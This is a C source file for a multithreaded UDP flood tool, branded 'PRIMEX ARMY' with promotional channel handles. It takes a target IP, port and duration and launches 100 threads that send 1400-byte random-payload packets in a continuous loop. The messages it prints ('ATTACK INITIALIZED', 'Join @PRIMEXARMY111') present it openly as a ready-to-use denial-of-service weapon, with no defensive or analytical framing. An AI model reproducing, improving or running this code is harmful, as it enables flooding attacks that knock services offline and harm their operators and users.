#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

// ==========================================
//        🚀 PRIMEX ARMY OFFICIAL 🚀
// ==========================================
// JOIN NOW: @PRIMEXARMY111
// JOIN NOW: @PRIMEXARMY_OFFICIAL
// OFF CREDIT: @TimeTravellerHu
// ==========================================

// Function to generate random payload for harder hitting packets
void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
}

void *send_udp_packets(void *arg) {
    char **args = (char **)arg;
    char *ip = args[1];
    int port = atoi(args[2]);
    int duration = atoi(args[3]);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(ip);

    // High weight packet padding
    char packet[1400]; // Standard MTU size for efficiency
    generate_payload(packet, sizeof(packet));

    time_t end_time = time(NULL) + duration;
    
    // Non-stop flooding loop
    while (time(NULL) < end_time) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("\nUsage: ./primex <IP> <PORT> <TIME>\n");
        return 1;
    }

    printf("\n[+] PRIMEX ARMY ATTACK INITIALIZED\n");
    printf("[+] Target: %s:%s\n", argv[1], argv[2]);
    printf("[+] Credits: @TimeTravellerHu\n");

    // Multi-threading for maximum CPU/Network utilization
    int thread_count = 100; 
    pthread_t threads[thread_count];

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, (void *)argv);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[!] Attack Finished. Join @PRIMEXARMY111\n");
    return 0;
}